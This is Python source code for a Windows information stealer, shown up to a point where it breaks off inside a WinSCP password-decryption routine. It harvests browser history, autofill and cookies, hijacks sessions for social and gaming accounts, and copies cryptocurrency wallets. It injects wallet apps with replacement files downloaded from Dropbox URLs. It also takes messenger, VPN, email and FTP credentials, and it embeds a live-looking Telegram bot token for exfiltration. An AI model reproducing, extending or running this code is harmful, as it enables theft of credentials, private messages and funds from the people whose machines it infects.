import ctypes
import asyncio
import base64
import re
import sqlite3
import sys
import winreg
import win32con # type: ignore
import aiohttp # type: ignore
import os
import shutil
import requests
import platform
import winreg
import psutil # type: ignore
import win32api # type: ignore
import json

from urllib.request import Request, urlopen
from pathlib import Path
import xml.etree.ElementTree as ET
from ctypes import *
from datetime import datetime, time


TOKEN = "6412347716:AAFL5wPS5gm0fx28XCBk0D4sxnkAwvBDz6E"
CHAT_ID = "-1002219378034"

atomic_injection_url = "https://www.dropbox.com/scl/fi/qu1h6fqpntoigvacpfrhm/atomic.asar?rlkey=rx4iua0f7ako14z1lew101y6w&st=bk2uzgpm&dl=1"
exodus_injection_url = "https://www.dropbox.com/scl/fi/36b3tkhpap0mch0b26739/exodus.asar?rlkey=njeph6oedzttpdc16iub88y92&st=qspyggx6&dl=1"

def logs_handler(error_message: str) -> None:
    hostname = platform.node()
    temp_dir = os.path.join(os.getenv('TEMP'), hostname)

    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    exc_message = error_message
    error_file_path = os.path.join(temp_dir, 'console_logs.txt')

    with open(error_file_path, 'a') as file:
        file.write(f"{exc_message}\n\n")
        
class ListFonction:
    Historys = list()
    Autofills = list()

    ClipBoard = list()
    Network = list()
    SystemInfo = list()
    SteamUserAccounts = list()
    MinecraftAccount = list()

class get_data:
    def __init__(self):
        self.profiles_full_path = []
        self.appdata = os.getenv('APPDATA')
        self.localappdata = os.getenv('LOCALAPPDATA')
        self.temp = os.getenv('TEMP')
        self.user_home = os.path.expanduser('~')

        self.browser_paths = {
            "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
            "Chrome": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
            "Chromium": os.path.join(self.localappdata, "Chromium", "User Data"),
            "Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
            "EpicPrivacy": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
            "Iridium": os.path.join(self.localappdata, "Iridium", "User Data"),
            "Opera": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
            "OperaGX": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
            "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
            "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data")
            }

        self.GeckoBrowsers = {
            "Firefox": os.path.join(self.appdata, "Mozilla", "Firefox", "Profiles"),
            "SeaMonkey": os.path.join(self.appdata, "Mozilla", "SeaMonkey", "Profiles"),
            "IceCat": os.path.join(self.appdata, "Mozilla", "icecat", "Profiles"),
            "Pale Moon": os.path.join(self.appdata, "Moonchild Productions", "Pale Moon", "Profiles"),
            "Waterfox": os.path.join(self.appdata, "Waterfox", "Profiles"),
            "Postbox": os.path.join(self.appdata, "Postbox", "Profiles"),
            "Thunderbird": os.path.join(self.appdata, "Thunderbird", "Profiles"),
            "Flock": os.path.join(self.appdata, "Flock", "Browser", "Profiles"),
        }


        self.GeckoFilesFullPath = list()
        self.GeckoCookieList = list()
        self.GeckoHistoryList = list()
        self.GeckoAutofiList = list()

    async def RunAllFonctions(self):
        await self.kill_browsers()
        await self.ListChromiumProfiles()
        await self.ListGeckoProfiles()

        taskk = [
            asyncio.create_task(self.GetGeckoAutoFills()),
            asyncio.create_task(self.GetGeckoCookies()),
            asyncio.create_task(self.GetGeckoHistorys()),
            asyncio.create_task(self.GetAutoFill()),
            asyncio.create_task(self.GetHistory()),
            asyncio.create_task(self.StealSteamUser()), 
            InfoStealer().run_all_fonctions()
        ]

        await asyncio.gather(*taskk)
        await self.InsideFolder()
        await self.SendAllData()

    async def kill_browsers(self):
        try:
            process_names = ["chrome.exe", "opera.exe", "edge.exe", "brave.exe", "vivaldi.exe", "iridium.exe", "epicprivacy.exe", "chromium.exe", "firefox"]
            process = await asyncio.create_subprocess_shell('tasklist',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)

            stdout, stderr = await process.communicate()
            if not process.returncode != 0:
                output_lines = stdout.decode(errors="ignore").split('\n')
                for line in output_lines:
                    for process_name in process_names:
                        if process_name.lower() in line.lower():
                            parts = line.split()
                            pid = parts[1]
                            process = await asyncio.create_subprocess_shell(f'taskkill /F /PID {pid}',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
                            await process.communicate()
        except Exception as Error:
            logs_handler(f"[ERROR] - killing browser processes: {str(Error)}")
            pass

    async def ListChromiumProfiles(self) -> None:
        try:
            for name, directory in self.browser_paths.items():
                if os.path.isdir(directory):
                    if "Opera" in name:
                        self.profiles_full_path.append(directory)
                    else:
                        self.profiles_full_path.extend(os.path.join(root, folder) for root, folders, _ in os.walk(directory) for folder in folders if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder)
        except Exception as Error:
            logs_handler(f"[ERROR] - searching browser list profiles: {str(Error)}")
            pass

    async def ListGeckoProfiles(self) -> None:
        try:
            for browser_name, directory in self.GeckoBrowsers.items():
                if os.path.isdir(directory):
                    for root, dirs, files in os.walk(directory):
                        for file in files:
                            if file.endswith(("cookies.sqlite", "places.sqlite", "formhistory.sqlite")):
                                file_path = os.path.join(root, file)
                                self.GeckoFilesFullPath.append(file_path)
    
        except Exception as Error:
            logs_handler(f"[ERROR] - getting gecko profiles: {str(Error)}")


    async def GetHistory(self) -> None:
        try:
            for path in self.profiles_full_path:
                HistoryData = os.path.join(path, "History")
                copied_file_path = os.path.join(self.Temp, "HistoryData.db")
                shutil.copyfile(HistoryData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select id, url, title, visit_count, last_visit_time from urls')
                historys = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for history in historys:
                    ListFonction.Historys.append(f"ID : {history[0]}\nURL : {history[1]}\nitle : {history[2]}\nVisit Count : {history[3]}\nLast Visit Time {history[4]}\n====================================================================================\n")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting chromium history: {str(Error)}")
        else:
            pass

    async def GetAutoFill(self) -> None:
        try:
            for path in self.profiles_full_path:
                AutofillData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "AutofillData.db")
                shutil.copyfile(AutofillData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select * from autofill')
                autofills = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for autofill in autofills:
                    if autofill:
                        ListFonction.Autofills.append(f"{autofill}\n")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting chromium autofills: {str(Error)}")
        else:
            pass

    async def GetGeckoCookies(self) -> None:
        try:
            for files in self.GeckoFilesFullPath:
                if "cookie" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
                    twitch_username = None
                    twitch_cookie = None
                    cookies = cursor.fetchall()
                    for cookie in cookies:
                        self.GeckoCookieList.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}\n")
                        if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                            asyncio.create_task(self.InstaSession(cookie[3], "Firefox"))
                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
                            asyncio.create_task(self.TikTokSession(cookie[3], "Firefox"))
                        if "twitter" in str(cookie[0]).lower() and str(cookie[1]) == "auth_token":
                            asyncio.create_task(self.TwitterSession(cookie[3], "Firefox"))
                        if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
                            asyncio.create_task(self.RedditSession(cookie[3], "Firefox"))
                        if "spotify" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
                            asyncio.create_task(self.SpotifySession(cookie[3], "Firefox"))
                        if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
                            asyncio.create_task(self.RobloxSession(cookie[3], "Firefox"))
                        if "twitch" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():
                            twitch_cookie = cookie[3]
                        if "twitch" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":
                            twitch_username = cookie[3]
                        if not twitch_username == None and not twitch_cookie == None:
                            asyncio.create_task(self.TwitchSession(twitch_cookie, twitch_username, "Firefox"))
                            twitch_username = None
                            twitch_cookie = None
                        if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
                            asyncio.create_task(self.RiotGamesSession(cookie[3], "Firefox"))
        except Exception as Error:
            logs_handler(f"[ERROR] - getting firefox cookies - {str(Error)}")
        else:
            pass
    async def GetGeckoHistorys(self) -> None:
        try:
            for files in self.GeckoFilesFullPath:
                if "places" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
                    historys = cursor.fetchall()
                    for history in historys:
                        self.GeckoHistoryList.append(f"ID: {history[0]}\nRL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n====================================================================================\n")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting firefox historys - {str(Error)}")
        else:
            pass

    async def GetGeckoAutoFills(self) -> None:
        try:
            for files in self.GeckoFilesFullPath:
                if "formhistory" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute("select * from moz_formhistory")
                    autofills = cursor.fetchall()
                    for autofill in autofills:
                        self.GeckoAutofiList.append(f"{autofill[0]} = {autofill[1]}\n")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting firefox autofills - {str(Error)}")
        else:
            pass

    async def StealWallets(self, copied_path: str) -> None:
        try:
            wallets_ext_names = {
                "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
                "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
                "Authy": "gaedmjdfmmahhbjefcbgaolhhanlaolb",
                "EOSAuthenticator": "oeljdldpnmdbchonielidgobddffflal",
                "GAuthAuthenticator": "ilgcnhelpchnceeipipijaljkblbcobl",
                "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
                "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
                "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
                "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
                "TrustWallet": "egjidjbpglichdcondbcbdnbeeppgdph",
                "Metamask (Opera)": "djclckkglechooblngghdinmeemkbgci",
                "Ronin": "bblmcdckkhkhfhhpfcchlpalebmonecp",
                }
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.appdata, "Bitcoin", "wallets"),
                "Bytecoin": os.path.join(self.appdata, "bytecoin"),
                "Coinomi": os.path.join(self.localappdata, "Coinomi", "Coinomi", "wallets"),
                "Atomic": os.path.join(self.appdata, "Atomic", "Local Storage", "leveldb"),
                "Dash": os.path.join(self.appdata, "DashCore", "wallets"),
                "Exodus": os.path.join(self.appdata, "Exodus", "exodus.wallet"),
                "Electrum": os.path.join(self.appdata, "Electrum", "wallets"),
                "WalletWasabi": os.path.join(self.appdata, "WalletWasabi", "Client", "Wallets"),
            }
            wallet_dir = os.path.join(copied_path, "Wallets")
            os.makedirs(wallet_dir, exist_ok=True)

            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings")
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        wallet_path = os.path.join(ext_path, wallet_addr)
                        if os.path.isdir(wallet_path):
                            try:
                                file_name = f"{os.path.basename(ext_path)} {wallet_name}"
                                dest_path = os.path.join(wallet_dir, file_name)
                                shutil.copytree(wallet_path, dest_path)
                            except Exception as Error:
                                logs_handler(f"[ERROR] - copying extensions Wallets {str(Error)}")


            for wallet_name, wallet_path in wallet_local_paths.items():
                try:
                    if os.path.exists(wallet_path):
                        dest_path = os.path.join(wallet_dir, wallet_name)
                        shutil.copytree(wallet_path, dest_path)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying desktop Wallets {str(Error)}")

        except Exception as Error:
            logs_handler(f"Error Stealing Wallets | {str(Error)}")


    async def InjectWallets(self) -> None:
        async def inject(app_path, asar_path, injection_url, license_path=None):
            if not Path(app_path).exists() or not Path(asar_path).exists():
                return

            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(injection_url) as response:
                        if response.status != 200:
                            return

                        with open(asar_path, 'wb') as writer:
                            async for chunk in response.content.iter_chunked(1024):
                                writer.write(chunk)

                        if license_path:
                            with open(license_path, 'w') as license_file:
                                license_file.write(f"{TOKEN}\n{CHAT_ID}")

            except Exception as Error:
                logs_handler(f"Error Injecting Wallet | {str(Error)}")

        atomic_path = os.path.join(self.localappdata, 'Programs', 'atomic')
        atomic_asar_path = os.path.join(atomic_path, 'resources', 'app.asar')
        atomic_license_path = os.path.join(atomic_path, 'LICENSE.electron.txt')
        await inject(atomic_path, atomic_asar_path, atomic_injection_url, atomic_license_path)

        exodus_path = os.path.join(self.localappdata, 'exodus')
        if Path(exodus_path).exists():
            exodus_dirs = [d for d in os.listdir(exodus_path) if d.startswith('app-')]
            for exodus_dir in exodus_dirs:
                exodus_versioned_path = os.path.join(exodus_path, exodus_dir)
                exodus_asar_path = os.path.join(exodus_versioned_path, 'resources', 'app.asar')
                exodus_license_path = os.path.join(exodus_versioned_path, 'LICENSE')
                await inject(exodus_versioned_path, exodus_asar_path, exodus_injection_url, exodus_license_path)


    async def StealTelegramSession(self, directory_path: str) -> None:
        try:
            tg_path = os.path.join(self.appdata, "Telegram Desktop", "tdata")
            
            if os.path.exists(tg_path):
                copy_path = os.path.join(directory_path, "Messenger", "Telegram Session")
                black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]

                processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                await processes.communicate()

                if not os.path.exists(copy_path):
                    os.makedirs(copy_path)

                for dirs in os.listdir(tg_path):
                    try:
                        _path = os.path.join(tg_path, dirs)
                        if not dirs in black_listed_dirs:
                            if os.path.isfile(_path):
                                shutil.copyfile(_path, os.path.join(copy_path, dirs))
                            elif os.path.isdir(_path):
                                shutil.copytree(_path, os.path.join(copy_path, dirs))
                    except Exception as Error:
                        logs_handler(f"[ERROR] - copying Telegram files to logs: {str(Error)}")
                        continue

                if len(os.listdir(copy_path)) == 0:
                    os.rmdir(copy_path)

        except Exception as Error:
            logs_handler(f"[ERROR] - getting Telegram files: {str(Error)}")
            pass

    async def StealWhatsApp(self, directory_path: str) -> None:
        try:
            whatsapp_session = os.path.join(directory_path, "Messenger", "WhatsApp")
            os.makedirs(whatsapp_session, exist_ok=True)
            regex_pattern = re.compile(r"^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$", re.IGNORECASE)
            parent_folders = [entry for entry in Path(self.localappdata, 'Packages').iterdir() if regex_pattern.match(entry.name)]

            for parent in parent_folders:
                local_state_folders = [entry for entry in parent.rglob("LocalState") if entry.is_dir()]
                for local_state_folder in local_state_folders:
                    profile_pictures_folders = [entry for entry in local_state_folder.rglob("profilePictures") if entry.is_dir()]
                    for profile_folder in profile_pictures_folders:
                        destination_path = os.path.join(whatsapp_session, local_state_folder.name, "profilePictures")
                        os.makedirs(destination_path, exist_ok=True)
                        shutil.copytree(profile_folder, destination_path, dirs_exist_ok=True)
                    try:
                        files_to_copy = [file for file in local_state_folder.rglob("*") if file.is_file() and file.stat().st_size <= 10 * 1024 * 1024 and re.search(r"\.db$|\.db-wal$|\.dat$", file.name)]
                        for file in files_to_copy:
                            dest_folder = os.path.join(whatsapp_session, local_state_folder.name)
                            os.makedirs(dest_folder, exist_ok=True)
                            shutil.copy(file, dest_folder)
                    except Exception as Error:
                        logs_handler(f"[ERROR] - copying Whatsapp files to logs: {str(Error)}")

        except Exception as Error:
            logs_handler(f"[ERROR] - getting Whatsapp files: {str(Error)}")
            pass

    async def StealSkype(self, directory_path: str) -> None:
        try:
            skype_folder = os.path.join(self.appdata, "Microsoft", "Skype for Desktop", "Local Storage", "leveldb")
            if os.path.exists(skype_folder):
                copy_path = os.path.join(directory_path, "Messenger", "Skype")
                os.makedirs(copy_path, exist_ok=True)
                try:
                    if os.path.isdir(skype_folder):
                        shutil.copytree(skype_folder, copy_path, dirs_exist_ok=True)
                    else:
                        shutil.copyfile(skype_folder, copy_path)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Skype files to logs: {str(Error)}")
                
                if len(os.listdir(copy_path)) == 0:
                    os.rmdir(copy_path)
                
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Skype files: {str(Error)}")
            pass

    async def StealSignal(self, directory_path: str) -> None:
        try:
            signal_path = os.path.join(self.appdata, 'Signal')
            copied_path = os.path.join(directory_path, "Messenger", "Signal")
            if os.path.isdir(signal_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                try:
                    if os.path.exists(Path(signal_path) / "sql"):shutil.copytree(Path(signal_path) / "sql", os.path.join(copied_path, "sql"))
                    elif os.path.exists(Path(signal_path) / "attachments.noindex"):shutil.copytree(Path(signal_path) / "attachments.noindex", os.path.join(copied_path, "attachments.noindex"))
                    elif os.path.exists(Path(signal_path) / "config.json"):shutil.copy(Path(signal_path) / "config.json", copied_path)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Signal files to logs: {str(Error)}")
                    pass
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)

        except Exception as Error:
            logs_handler(f"[ERROR] - getting Signal files: {str(Error)}")
            pass
 
    async def StealElement(self, directory_path: str) -> None:
        try:
            element_path = os.path.join(self.appdata, 'Element')
            copied_path = os.path.join(directory_path, "Messenger", "Element")
            if os.path.isdir(element_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                indexed_db_src = Path(element_path) / "IndexedDB"
                local_storage_src = Path(element_path) / "Local Storage"
                try:
                    if os.path.exists(indexed_db_src):
                        shutil.copytree(indexed_db_src, os.path.join(copied_path, "IndexedDB"))
                    if os.path.exists(local_storage_src):
                        shutil.copytree(local_storage_src, os.path.join(copied_path, "Local Storage"))
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Element files to logs: {str(Error)}")
                    pass
                
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Element files: {str(Error)}")
            pass 
   
    async def StealViber(self, directory_path: str) -> None:
        try:
            viber_path = os.path.join(self.appdata, 'ViberPC')
            copied_path = os.path.join(directory_path, "Messenger", "Viber")
            if os.path.isdir(viber_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                pattern = re.compile(r"^(\+?[0-9]{1,12})$")
                directories = [entry for entry in Path(viber_path).iterdir() if entry.is_dir() and pattern.match(entry.name)]
                root_files = [file for file in Path(viber_path).glob("*.db")]

                try:
                    for root_file in root_files:
                        shutil.copy(root_file, copied_path)

                    for directory in directories:
                        destination_path = os.path.join(copied_path, directory.name)
                        shutil.copytree(directory, destination_path)
                        files = [file for file in directory.rglob("*") if file.is_file() and re.search(r"\.db$|\.db-wal$", file.name)]
                        for file in files:
                            dest_file_path = os.path.join(destination_path, file.name)
                            shutil.copy(file, dest_file_path)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Viber files to logs: {str(Error)}")
               
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Viber files: {str(Error)}")
            pass
  

    async def StealPidgin(self, directory_path: str) -> None:
        try:
            pidgin_folder = os.path.join(self.appdata, '.purple', "accounts.xml")
            if os.path.exists(pidgin_folder):
                pidgin_accounts = os.path.join(directory_path, "Messenger", "Pidgin")
                os.makedirs(pidgin_accounts, exist_ok=True)
                try:
                    if pidgin_folder.is_dir():
                        shutil.copytree(pidgin_folder, pidgin_accounts, dirs_exist_ok=True)
                    else:
                        shutil.copy2(pidgin_folder, pidgin_accounts)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Pidgin files to logs: {str(Error)}")
                    
                if len(os.listdir(pidgin_accounts)) == 0:
                    os.rmdir(pidgin_accounts)
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Pidgin files: {str(Error)}")
            pass

    async def StealTox(self, directory_path: str) -> None:
        try:
            tox_folder = os.path.join(self.appdata, 'Tox')
            if os.path.isdir(tox_folder):
                tox_session = os.path.join(directory_path, "Messenger", "Tox")
                os.makedirs(tox_session, exist_ok=True)
                for item in Path(tox_folder).iterdir():
                    try:
                        if item.is_dir():
                            shutil.copytree(item, tox_session, dirs_exist_ok=True)
                        else:
                            shutil.copy2(item, tox_session)
                    except Exception as Error:
                        logs_handler(f"[ERROR] - copying Tox files to logs: {str(Error)}")
                if len(os.listdir(tox_session)) == 0:
                    os.rmdir(tox_session)
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Tox files: {str(Error)}")
            pass

    async def StealProtonVPN(self, directory_path: str) -> None:
        try:
            protonvpn_folder = os.path.join(self.localappdata, 'ProtonVPN')
            if not os.path.isdir(protonvpn_folder):
                return
            
            async def get_hierarchy(root_dir, pattern):
                return [entry for entry in root_dir.iterdir() if entry.is_dir() and re.match(pattern, entry.name)]
            protonvpn_account = os.path.join(directory_path, "VPN", 'ProtonVPN')
            os.makedirs(protonvpn_account, exist_ok=True)
            pattern = re.compile(r"^ProtonVPN_Url_[A-Za-z0-9]+$")
            directories = await get_hierarchy(Path(protonvpn_folder), pattern)
            for directory in directories:
                destination_path = os.path.join(protonvpn_account, directory.name)
                try:
                    if directory.is_dir():
                        shutil.copytree(directory, destination_path, dirs_exist_ok=True)
                    else:
                        shutil.copy2(directory, destination_path)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying ProtonVPN files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting ProtonVPN files: {str(Error)}")
            pass
        
    async def StealOpenVPN(self, directory_path: str) -> None:
        try:
            openvpn_folder = os.path.join(self.appdata, 'OpenVPN Connect')
            if not os.path.isdir(openvpn_folder):
                return
            
            openvpn_accounts = os.path.join(directory_path, "VPN", 'OpenVPN')
            os.makedirs(openvpn_accounts, exist_ok=True)
            profiles_src = os.path.join(openvpn_folder, 'profiles')
            config_src = os.path.join(openvpn_folder, 'config.json')
            try:
                if Path(profiles_src).is_dir():shutil.copytree(Path(profiles_src), openvpn_accounts, dirs_exist_ok=True)
                else:shutil.copy2(Path(profiles_src), openvpn_accounts)
                if Path(config_src).is_dir():shutil.copytree(Path(config_src), openvpn_accounts, dirs_exist_ok=True)
                else:shutil.copy2(Path(config_src), openvpn_accounts)
            except Exception as Error:
                logs_handler(f"[ERROR] - copying OpenVPN files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting OpenVPN files: {str(Error)}")
            pass

    async def StealSurfsharkVPN(self, directory_path: str) -> None:
        try:
            surfsharkvpn_folder = os.path.join(self.appdata, 'Surfshark')
            if not os.path.isdir(surfsharkvpn_folder):
                return
            
            surfsharkvpn_account = os.path.join(directory_path, "VPN", 'Surfshark')
            os.makedirs(surfsharkvpn_account, exist_ok=True)
            files_to_copy = ["data.dat", "settings.dat", "settings-log.dat", "private_settings.dat"]
            for root, _, files in os.walk(surfsharkvpn_folder):
                for file in files:
                    try:
                        if file in files_to_copy:
                            shutil.copy2(os.path.join(root, file), surfsharkvpn_account)
                    except Exception as Error:
                        logs_handler(f"[ERROR] - copying OpenVPN files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] -getting SurfsharkVPN files: {str(Error)}")
            pass

    async def BackupThunderbird(self, directory_path: str) -> None:
        try:
            thunderbird_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Thunderbird', 'Profiles')
            if not os.path.isdir(thunderbird_folder):
                return
            
            thunderbird_backup = os.path.join(directory_path, "Email", 'Thunderbird')
            os.makedirs(thunderbird_backup, exist_ok=True)
            pattern = re.compile(r"^[a-z0-9]+\.default-esr$")
            async def get_hierarchy(root_dir, pattern):
                return [entry for entry in root_dir.iterdir() if entry.is_dir() and re.match(pattern, entry.name)]
            directories = await get_hierarchy(Path(thunderbird_folder), pattern)
            filter_files = ["key4.db", "key3.db", "logins.json", "cert9.db", "*.js"]
            for directory in directories:
                destination_path = os.path.join(thunderbird_backup, directory.name)
                os.makedirs(destination_path, exist_ok=True)
                for file_pattern in filter_files:
                    for file in directory.rglob(file_pattern):
                        relative_path = file.relative_to(directory)
                        dest_file_path = os.path.join(destination_path, relative_path)
                        dest_file_dir = os.path.dirname(dest_file_path)
                        try:
                            if not os.path.isdir(dest_file_dir):
                                os.makedirs(dest_file_dir, exist_ok=True)
            
                            if file.is_dir():
                                shutil.copytree(file, dest_file_path, dirs_exist_ok=True)
                            else:
                                shutil.copy2(file, dest_file_path)
                        except Exception as Error:
                            logs_handler(f"[ERROR] - copying BackupThunderBird files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting BackupThunderBird files: {str(Error)}")
            pass


    async def BackupMailbird(self, directory_path: str) -> None:
        try:
            mailbird_folder = os.path.join(self.localappdata, 'MailBird')
            if not os.path.isdir(mailbird_folder):
                return
            
            mailbird_db = os.path.join(directory_path, "Email", 'MailBird')
            os.makedirs(mailbird_db, exist_ok=True)
            store_db = os.path.join(mailbird_folder, 'Store', 'Store.db')
            try:
                if Path(store_db).is_dir():
                    shutil.copytree(Path(store_db), mailbird_db, dirs_exist_ok=True)
                else:
                    shutil.copy2(Path(store_db), mailbird_db)
            except Exception as Error:
                logs_handler(f"[ERROR] - copying BackupMailBird files to logs: {str(Error)}")
    
        except Exception as Error:
            logs_handler(f"[ERROR] - getting BackupMailBird files: {str(Error)}")
            pass


    async def StealFileZilla(self, directory_path: str) -> None:
        try:
            filezilla_folder = os.path.join(self.appdata, 'FileZilla')
            if not os.path.isdir(filezilla_folder):
                return
            
            filezilla_hosts = os.path.join(directory_path, "FTP Clients", 'FileZilla')
            os.makedirs(filezilla_hosts, exist_ok=True)
            recent_servers_xml = os.path.join(filezilla_folder, 'recentservers.xml')
            site_manager_xml = os.path.join(filezilla_folder, 'sitemanager.xml')

            def parse_server_info(xml_content):
                host_match = re.search(r"<Host>(.*?)</Host>", xml_content)
                port_match = re.search(r"<Port>(.*?)</Port>", xml_content)
                user_match = re.search(r"<User>(.*?)</User>", xml_content)
                pass_match = re.search(r"<Pass encoding=\"base64\">(.*?)</Pass>", xml_content)

                server_host = host_match.group(1) if host_match else ""
                server_port = port_match.group(1) if port_match else ""
                server_user = user_match.group(1) if user_match else ""
                if not server_user:
                    return f"Host: {server_host}\nPort: {server_port}\n"
                encoded_pass = pass_match.group(1) if pass_match else ""
                decoded_pass = (encoded_pass and base64.b64decode(encoded_pass).decode('utf-8') if encoded_pass else "")
                return f"Host: {server_host}\nPort: {server_port}\nUser: {server_user}\nPass: {decoded_pass}\n---------------------------------------------------|\n"

            servers_info = []
            for xml_file in [recent_servers_xml, site_manager_xml]:
                if os.path.isfile(xml_file):
                    with open(xml_file, 'r') as file:
                        xml_content = file.read()
                        server_entries = re.findall(r"<Server>(.*?)</Server>", xml_content, re.DOTALL)
                        for server_entry in server_entries:
                            servers_info.append(parse_server_info(server_entry))

            with open(os.path.join(filezilla_hosts, 'Hosts.txt'), 'w') as file:
                file.write("\n".join(servers_info))
            
            output_path = os.path.join(filezilla_hosts, 'Hosts.txt')
            if os.path.getsize(output_path) == 0:
                os.remove(output_path)
                folder_dirname = os.path.dirname(output_path)
                if not os.listdir(folder_dirname):
                    os.rmdir(folder_dirname)
                
        except Exception as Error:
            logs_handler(f"[ERROR] - getting FileZilla files: {str(Error)}")
            pass

    async def StealWinSCP(self, directory_path: str) -> None:
        try:
            registry_path = r"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
            winscp_session = os.path.join(directory_path, "FTP Clients", 'WinSCP')
            os.makedirs(winscp_session, exist_ok=True)
            output_path = os.path.join(winscp_session, 'WinSCP-sessions.txt')

            def decrypt_winscp_password(hostname, username, password):
                check_flag = 255
                magic = 163
                key = hostname + username
                remaining_pass = password
                flag_and_pass = decrypt_next_character_winscp(remaining_pass)
                stored_flag = flag_and_pass['flag']
                if stored_flag == check_flag:
                    remaining_pass = remaining_pass[2:]
                    flag_and_pass = decrypt_next_character_winscp(remaining_pass)
                length = flag_and_pass['flag']
                remaining_pass = remaining_pass[(flag_and_pass['flag'] * 2):]
                final_output = ""
                for _ in range(length):
                    flag_and_pass = decrypt_next_character_winscp(remaining_pass)
                    final_output += chr(flag_and_pass['flag'])
                if stored_flag == check_flag:
                    return final_output[len(key):]
                return final_output

            def decrypt_next_character_winscp(remaining_pass):
                magic = 163
                firstval = "0123456789ABCDEF".index(remaining_pass[0]) * 16
                secondval = "0123456789ABCDEF".index(remaining_pass[1])
                added = firstval + secondval
                decrypted_result = ((~(added ^ magic)) + 256) % 256
                return {'flag': decrypted_result, 'remaining_pass': remaining_pass[2:]}

            output = ""
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path) as reg_key:
                    index = 0
                    while True:
                        try:
                            session_name = winreg.EnumKey(reg_key, index)
